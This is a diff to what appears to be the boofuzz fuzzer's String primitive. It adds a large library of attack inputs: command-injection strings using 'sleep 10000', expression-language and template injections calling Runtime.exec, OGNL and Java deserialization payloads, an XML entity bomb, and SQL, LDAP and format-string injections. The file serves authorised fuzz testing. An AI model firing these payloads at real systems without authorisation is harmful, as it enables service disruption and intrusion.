@@ -1,4 +1,7 @@
 import random
+import base64
+import os
+import json
 
 import six
 from past.builtins import range
@@ -6,10 +9,45 @@ from past.builtins import range
 from .base_primitive import BasePrimitive
 from .. import helpers
 
+DIR = os.path.dirname(os.path.abspath(__file__))
+BLONS_FILENAME = DIR + os.sep + "blns.base64.json"
+RFC_KEYWORDS_FILENAME = DIR + os.sep + "RFC_keywords.txt"
 
 class String(BasePrimitive):
     # store fuzz_library as a class variable to avoid copying the ~70MB structure across each instantiated primitive.
     _fuzz_library = []
+    _CMD= "sleep 10000"
+    _specialCharacters = [b' ', b'!', b'"', b'#', b'$', b'%', b'&', b'(', b')', b'*', b'+', b',', b'-', b'.', b'/', b':', b';', b'<',
+                         b'=', b'>', b'?', b'@', b'[', b'\\', b']', b'^', b'_', b'`', b'{', b'|', b'}', b'~', b'\'', b't', b'b', b'r',
+                         b'n', b'f', b'0', b'1', b'2', b'u', b'o', b'x', b'\r', b'\n',
+                         b"\u560a", b"\u560d", b"\u563e", b"\u563c"
+                         ]
+
+    _singleLineComments = [
+        b"#", b"//", b"-- ", b";", b"%", b"'", b"\"", b"\\", b"!", b"*", b"\r", b"\n", b"\r\n"
+    ]
+
+    _multilineComments = [
+        b"/*test*/", b"(*test*)", b"%(test)%", b"{test}", b"{-test-}", b"#|test|#", b"#=test=#", b"#[test]#", b"--[[test]]",
+        b"<!--test-->"
+    ]
+
+    _concatenation = [
+        b"", b" ", b"+", b".", b"&", b"||", b"//", b"~", b"<>", b"..", b":", b"^", b"++", b"$+", b","
+    ]
+
+    _stringDelimiters = [
+        b"", b'"', b"'", b"'''", b"]]", b"`", b"\r", b"\n"
+    ]
+
+    _numericInjections = [
+        b"+0", b"-0", b"/1", b"*1", b" sum 0", b" difference 0", b" product 1", b" add 0", b" sub 0", b" mul 1", b" div 1",
+        b" idiv 1", b"**1", b"^1", b"|0", b" $ne 0", b" $gt 0", b" $lt 0", b" $eq 0"
+    ]
+
+    _commandSeparators = [
+        b";", b",", b":", b"\n", b"\r", b"\r\n", b"\u0008", b"\u0009", b"\r", b"\n", b"\r\n", b"&&", b"||", b"&", b"|", b"\u001a", b">"
+    ]
 
     def __init__(self, value, size=-1, padding=b"\x00", encoding="ascii", fuzzable=True, max_len=-1, name=None):
         """
@@ -59,8 +97,43 @@ class String(BasePrimitive):
             self._value * 10 + b"\xfe",
             self._value * 100 + b"\xfe",
         ]
-        if not self._fuzz_library:
-            self._fuzz_library = [
+        if not String._fuzz_library:
+            String._fuzz_library = [
+                # java deserialization
+                "application/x-java-serialized-object",
+                "rO0",
+                "rO0ABX1////3",
+                "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=",
+                "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHB//3dwR//3cHBwcHBwcHBwcA==",
+                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=",
+                "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH//d1cQB+AAB3dXEAfgAAf/93VxAH4AAH//d1cQB+AAB3dXEAfgAAf/93VxAH4AAH//d1cQB+AAB//3",
+                "\xAC\xED\x00\x05",
+                # expression language
+                "Class['classLoader']['resources']['cacheObjectMaxSize']=foo",
+                "${T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")}",
+                "${T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")}",
+                "T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")",
+                "T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")",
+                "import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"" + self._CMD + "\")",
+                "import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"" + self._CMD + "\")",
+                # ognl
+                "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exit(1))}",
+                "%{#f = #_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')\n#f.setAccessible(true)\n#f.set(#_memberAccess, true)\n#rt = @java.lang.Runtime@getRuntime()\n#rt.exit(1)\n}",
+                # template injections
+                "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"" + self._CMD + "\").waitFor()",
+                "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"" + self._CMD + "\").waitFor()",
+                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"" + self._CMD + "\") }",
+                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"" + self._CMD + "\") }",
+                # some sql
+                "'+BENCHMARK(40000000,SHA1(1337))+'",
+                # xml processing
+                "<!--?xml version=\"1.0\" ?--><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\"><tag>&lol9;</tag>",
+                # other forms of deserialization
+                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><boom type=\"yaml\"><![CDATA[--- !ruby/object:UnsafeObject attribute1: value1]]></boom>",
+                "<void/>",
+                "{'void': null}",
+                "<string class ='void'>Hello,world!</string>",
+                "!!java.net.URL {}: http://www.google.com",
                 "",
                 # strings ripped from spike (and some others I added)
                 "/.:/" + "A" * 5000 + "\x00\x00",
@@ -86,10 +159,23 @@ class String(BasePrimitive):
                 # format strings.
                 "%n" * 100,
                 "%n" * 500,
-                '"%n"' * 500,
+                b'"%n"' * 500,
                 "%s" * 100,
                 "%s" * 500,
-                '"%s"' * 500,
+                b'"%s"' * 500,
+                "%x" * 500,
+                "%4$2s%3$2s%2$2s%1$2s" * 500,
+                "e=%+10.4f" * 500,
+                "%1$x",
+                "%2$x",
+                "%3$x",
+                "%4$x",
+                "%5$x",
+                "%6$x",
+                "%7$x",
+                "%8$x",
+                "%9$x",
+                "%10$x",
                 # command injection.
                 "|touch /tmp/SULLEY",
                 ";touch /tmp/SULLEY;",
@@ -100,76 +186,80 @@ class String(BasePrimitive):
                 ";reboot;",
                 "\nreboot\n",
                 # fuzzdb command injection
-                "a)|reboot;",
-                "CMD=$'reboot';$CMD",
-                "a;reboot",
-                "a)|reboot",
-                "|reboot;",
-                "'reboot'",
-                '^CMD=$"reboot";$CMD',
-                "`reboot`",
-                "%0DCMD=$'reboot';$CMD",
-                "/index.html|reboot|",
-                "%0a reboot %0a",
-                "|reboot|",
-                "||reboot;",
-                ";reboot/n",
-                "id",
-                ";id",
-                "a;reboot|",
-                "&reboot&",
-                "%0Areboot",
-                "a);reboot",
-                "$;reboot",
-                '&CMD=$"reboot";$CMD',
-                '&&CMD=$"reboot";$CMD',
-                ";reboot",
+                "|touch /tmp/INJECTX",
+                ";touch /tmp/INJECTX;",
+                "|" + self._CMD + "",
+                ";" + self._CMD + ";",
+                "\n" + self._CMD + "\n",
+                "a)|" + self._CMD + ";",
+                "CMD=$'" + self._CMD + "';$CMD",
+                "a;" + self._CMD + "",
+                "a)|" + self._CMD + "",
+                "|" + self._CMD + ";",
+                "'" + self._CMD + "'",
+                "^CMD=$\"" + self._CMD + "\";$CMD",
+                "`" + self._CMD + "`",
+                "%0DCMD=$'" + self._CMD + "';$CMD",
+                "/index.html|" + self._CMD + "|",
+                "%0a " + self._CMD + " %0a",
+                "|" + self._CMD + "|",
+                "||" + self._CMD + ";",
+                ";" + self._CMD + "/n",
+                "a;" + self._CMD + "|",
+                "&" + self._CMD + "&",
+                "%0A" + self._CMD + "",
+                "a);" + self._CMD + "",
+                "$;" + self._CMD + "",
+                "&CMD=$\"" + self._CMD + "\";$CMD",
+                "&&CMD=$\"" + self._CMD + "\";$CMD",
+                ";" + self._CMD + "",
                 "id;",
-                ";reboot;",
-                "&CMD=$'reboot';$CMD",
-                "& reboot &",
-                "; reboot",
-                "&&CMD=$'reboot';$CMD",
-                "reboot",
-                "^CMD=$'reboot';$CMD",
-                ";CMD=$'reboot';$CMD",
-                "|reboot",
-                "<reboot;",
-                "FAIL||reboot",
-                "a);reboot|",
-                '%0DCMD=$"reboot";$CMD',
-                "reboot|",
-                "%0Areboot%0A",
-                "a;reboot;",
-                'CMD=$"reboot";$CMD',
-                "&&reboot",
-                "||reboot|",
-                "&&reboot&&",
-                "^reboot",
-                ";|reboot|",
-                "|CMD=$'reboot';$CMD",
+                ";" + self._CMD + ";",
+                "&CMD=$'" + self._CMD + "';$CMD",
+                "& " + self._CMD + " &",
+                "; " + self._CMD + "",
+                "&&CMD=$'" + self._CMD + "';$CMD",
+                "" + self._CMD + "",
+                "^CMD=$'" + self._CMD + "';$CMD",
+                ";CMD=$'" + self._CMD + "';$CMD",
+                "|" + self._CMD + "",
+                "<" + self._CMD + ";",
+                "FAIL||" + self._CMD + "",
+                "a);" + self._CMD + "|",
+                "%0DCMD=$\"" + self._CMD + "\";$CMD",
+                "" + self._CMD + "|",
+                "%0A" + self._CMD + "%0A",
+                "a;" + self._CMD + ";",
+                "CMD=$\"" + self._CMD + "\";$CMD",
+                "&&" + self._CMD + "",
+                "||" + self._CMD + "|",
+                "&&" + self._CMD + "&&",
+                "^" + self._CMD + "",
+                ";|" + self._CMD + "|",
+                "|CMD=$'" + self._CMD + "';$CMD",
                 "|nid",
-                "&reboot",
-                "a|reboot",
-                "<reboot%0A",
-                'FAIL||CMD=$"reboot";$CMD',
-                "$(reboot)",
-                "<reboot%0D",
-                ";reboot|",
+                "&" + self._CMD + "",
+                "a|" + self._CMD + "",
+                "<" + self._CMD + "%0A",
+                "FAIL||CMD=$\"" + self._CMD + "\";$CMD",
+                "$(" + self._CMD + ")",
+                "<" + self._CMD + "%0D",
+                ";" + self._CMD + "|",
                 "id|",
-                "%0Dreboot",
-                "%0Areboot%0A",
-                "%0Dreboot%0D",
-                ";system('reboot')",
-                '|CMD=$"reboot";$CMD',
-                ';CMD=$"reboot";$CMD',
-                "<reboot",
-                "a);reboot;",
-                "& reboot",
-                "| reboot",
-                "FAIL||CMD=$'reboot';$CMD",
-                '<!--#exec cmd="reboot"-->',
-                "reboot;",
+                "%0D" + self._CMD + "",
+                "%0A" + self._CMD + "%0A",
+                "%0D" + self._CMD + "%0D",
+                ";system('" + self._CMD + "')",
+                "|CMD=$\"" + self._CMD + "\";$CMD",
+                ";CMD=$\"" + self._CMD + "\";$CMD",
+                "<" + self._CMD + "",
+                "a);" + self._CMD + ";",
+                "& " + self._CMD + "",
+                "| " + self._CMD + "",
+                "FAIL||CMD=$'" + self._CMD + "';$CMD",
+                "<!--#exec self._CMD=\"" + self._CMD + "\"-->",
+                "" + self._CMD + ";",
+                "LD_PRELOAD=/proc/self/fd/0",
                 # some binary strings.
                 "\xde\xad\xbe\xef",
                 "\xde\xad\xbe\xef" * 10,
@@ -178,8 +268,97 @@ class String(BasePrimitive):
                 "\xde\xad\xbe\xef" * 10000,
                 # miscellaneous.
                 "\r\n" * 100,
-                "<>" * 500,  # sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt)
+                "<>" * 500,  # sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt),
+                "¶§¼½¿",
+                # special numbers
+                "0",
+                "-0",
+                "1",
+                "-1",
+                "32767",
+                "-32768",
+                "65537",
+                "-65537",
+                "16777217",
+                "357913942",
+                "-357913942",
+                "2147483648",
+                "4294967296",
+                "536870912",
+                "-536870912",
+                "99999999999",
+                "-99999999999",
+                "0x100",
+                "0x1000",
+                "0x3fffffff",
+                "0x7ffffffe",
+                "0x7fffffff",
+                "0x80000000",
+                "0xffff",
+                "0xfffffffe",
+                "0xfffffff",
+                "0xffffffff",
+                "0x10000",
+                "0x100000",
+                "0x99999999",
+                b'1.79769313486231E+308',
+                b'3.39519326559384E-313',
+                b'NaN',
+                # special paths
+                "\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\",
+                "\\\\.\\CdRom0\\",
+                "\\\\.\\c:",
+                "\\\\?\\",
+                "\\\\?\\Device\\CdRom0",
+                "\\\\?\\Device\\Floppy0",
+                "\\\\?\\Device\\Harddisk0\\Partition0",
+                "\\\\?\\Device\\Harddisk1\\Partition1",
+                "\\\\localhost\\admin$\\",
+                "\\\\localhost\\C$\\",
+                "\\\\localhost\\C$\\",
+                "\\\\?\\UNC\\localhost\\C$\\",
+                "\\\\127.0.0.1\\admin$\\",
+                "\\\\127.0.0.1\\C$\\",
+                "\\\\127.0.0.1\\C$\\",
+                "\\\\?\\UNC\\127.0.0.1\\C$\\",
+
+                # xpath injections
+                "x' or name()='username' or b'x'='y",
+                # ldap injections
+                "*(|(mail=*))", "*(|(objectclass=*))",
+                "*()|&'",
+                "admin*",
+                "admin*)((|userpassword=*)",
+                "*)(uid=*))(|(uid=*",
+                # sql injections
+                "'--",
+                "' or 1=1--",
+                "1 or 1=1--",
+                "' or 1 in (@@version)--",
+                "1 or 1 in (@@version)--",
+                "'; waitfor delay b'0:30:0'--",
+                "1; waitfor delay b'0:30:0'--",
             ]
+
+            # Big list of naugthy strings
+            if "BOOFUZZ_SKIP_BLONS" not in os.environ:
+                with open(BLONS_FILENAME) as f:
+                    blons = json.load(f)
+                    String._fuzz_library.extend(map(base64.b64decode,blons))
+                    String._fuzz_library.extend(blons)
+
+            # all command (UPPER case words) from all RFC documents
+            if "BOOFUZZ_SKIP_RFC_KEYWORDS" not in os.environ:
+                with open(RFC_KEYWORDS_FILENAME) as f:
+                    rfc_keywords = f.readlines()
+                    String._fuzz_library.extend(rfc_keywords)
+
+            if "BOOFUZZ_DICT_DIR" in os.environ:
+                for (dirpath, dirnames, filenames) in os.walk(os.environ["BOOFUZZ_DICT_DIR"]):
+                    for fileName in filenames:
+                        with open(os.path.join(dirpath, fileName)) as f:
+                            entries = helpers.load_fuzz_dictionary(f)
+                            String._fuzz_library.extend(entries)
 
             # add some long strings.
             self.add_long_strings("C")
@@ -219,18 +398,20 @@ class String(BasePrimitive):
                     # Location of random byte
                     loc = random.randint(1, len(s))
                     s = s[:loc] + "\x00" + s[loc:]
-                self._fuzz_library.append(s)
+                String._fuzz_library.append(s)
 
                 # TODO: Add easy and sane string injection from external file/s
+
+        self.this_library.extend(self.generate_payloads(self._value, encoding))
 
         # Remove any fuzz items greater than self.max_len
         if self.max_len > 0:
             if any(len(s) > self.max_len for s in self.this_library):
                 # Pull out the bad string(s):
                 self.this_library = list(set([t[: self.max_len] for t in self.this_library]))
-            if any(len(s) > self.max_len for s in self._fuzz_library):
-                # Pull out the bad string(s):
-                self._fuzz_library = list(set([t[: self.max_len] for t in self._fuzz_library]))
+            #if any(len(s) > self.max_len for s in String._fuzz_library):
+            #    # Pull out the bad string(s):
+            #    String._fuzz_library = list(set([t[: self.max_len] for t in String._fuzz_library]))
 
     @property
     def name(self):
@@ -279,7 +460,7 @@ class String(BasePrimitive):
                 return False
 
             # update the current value from the fuzz library.
-            self._value = (self._fuzz_library + self.this_library)[self._mutant_index]
+            self._value = (String._fuzz_library + self.this_library)[self._mutant_index]
 
             # increment the mutation count.
             self._mutant_index += 1
@@ -290,7 +471,7 @@ class String(BasePrimitive):
 
             # ignore library items greater then user-supplied length.
             # TODO: might want to make this smarter.
-            if len(self._value) > self.size:
+            if len(self._value) > self.size or len(self._value) > self.max_len:
                 continue
             else:
                 return True
@@ -302,17 +483,50 @@ class String(BasePrimitive):
         @rtype:  int
         @return: Number of mutated forms this primitive can take
         """
-        return len(self._fuzz_library) + len(self.this_library)
+        return len(String._fuzz_library) + len(self.this_library)
 
     def _render(self, value):
         """
         Render string value, properly padded.
         """
 
-        if isinstance(value, six.text_type):
+        if isinstance(value, six.string_types):
             value = helpers.str_to_bytes(value)
+        elif isinstance(value, six.text_type):
+            value = value.encode(self.encoding)
+        else:
+            pass
+            #raise Exception("Unknown string type: {}".format(type(value)))
 
         # pad undersized library items.
         if len(value) < self.size:
             value += self.padding * (self.size - len(value))
         return helpers.str_to_bytes(value)
+
+    def generate_payloads(self, value: str, encoding):
+        attacks = []
+        for special1 in self._specialCharacters:
+            for special2 in self._specialCharacters:
+                attacks.append(value + special1 + special2)
+                attacks.append(value + b"\\" + special1 + b"\\" + special2)
+                attacks.append(value + b"\\\\" + special1 + b"\\\\" + special2 )
+
+        for delimiter in self._stringDelimiters:
+            for comment in self._singleLineComments:
+                attacks.append(value + delimiter + comment)
+
+        for delimiter in self._stringDelimiters:
+            for comment in self._multilineComments:
+                attacks.append(value + delimiter + comment + delimiter)
+
+        for delimiter in self._stringDelimiters:
+            for concatenation in self._concatenation:
+                attacks.append(value + delimiter + concatenation + delimiter)
+
+        for numeric in self._commandSeparators:
+            attacks.append(value + numeric)
+
+        for command in self._commandSeparators:
+            attacks.append(value + command + self._CMD.encode(encoding) )
+
+        return attacks
